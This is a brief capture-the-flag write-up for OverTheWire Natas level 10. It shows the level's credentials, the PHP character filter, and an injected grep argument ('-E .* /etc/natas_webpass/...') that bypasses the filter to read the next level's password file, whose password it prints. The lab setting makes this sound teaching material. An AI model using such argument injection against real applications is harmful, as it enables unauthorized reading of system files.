# natas level10
natas is CTF with web application.
password will be written `/etc/natas_webpass/natas10`.

## using credential is below.
- User:natas10
- Pass:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

## using tools.
- shell(curl, base64, etc)
- lynx
check web site by lynx.
`lynx http://natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu@natas10.natas.labs.overthewire.org`


followings is message of this page.
~~~
   For security reasons, we now filter on certain characters
      Find words containing: ____________________ Search
         Output:
~~~

I check page source and only followings are filtered `| or & or ;`.
~~~
if(preg_match('/[;|&]/',$key)) {
   print "Input contains an illegal character!";
} else {
~~~

I send data of `-E .* /etc/natas_webpass/natas10 `, 
/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK



